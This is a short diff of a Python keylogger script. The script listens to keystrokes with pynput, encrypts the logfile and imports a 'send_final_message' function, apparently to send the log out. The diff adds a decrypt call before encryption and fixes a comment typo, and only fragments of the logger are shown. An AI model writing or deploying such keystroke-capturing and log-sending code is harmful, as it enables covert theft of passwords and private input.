@@ -1,7 +1,9 @@
 from pynput.keyboard import Listener, Key
+from decrypt import decrypt                                          
 from encrypt import encrypt
 from quickstart import send_final_message
 
+decrypt()                                                           #called to make sure file is decrypted b4 encryption
 
 count = 0
 
@@ -38,7 +40,7 @@ with Listener(on_press=on_press, on_release=on_release) as l:
     l.join()
 
 
-encrypt()                                       #Encrypting the logfile from encrypte script
+encrypt()                                       #Encrypting the logfile from encrypt script
 
 try:
     if __name__ == "__main__":
